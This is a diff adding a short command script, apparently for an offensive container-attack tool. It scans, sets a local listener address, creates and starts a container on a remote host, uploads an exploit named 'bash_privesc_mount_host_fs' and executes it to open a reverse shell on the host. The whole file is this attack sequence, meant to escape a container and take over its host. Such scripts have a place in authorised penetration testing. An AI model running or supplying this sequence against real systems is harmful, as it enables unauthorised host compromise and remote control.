@@ -1,0 +1,17 @@
+scan
+set lhost=192.168.1.184
+
+% Create a new container named container1 on the remote host
+create container1
+set name=container1
+start
+
+% Let's start the new container and show all the running containers
+lstconts
+
+% Upload the default exploit into the container
+% The default exploit is: bash_privesc_mount_host_fs
+upload
+
+% Let's start a reverse shell on the host
+execute
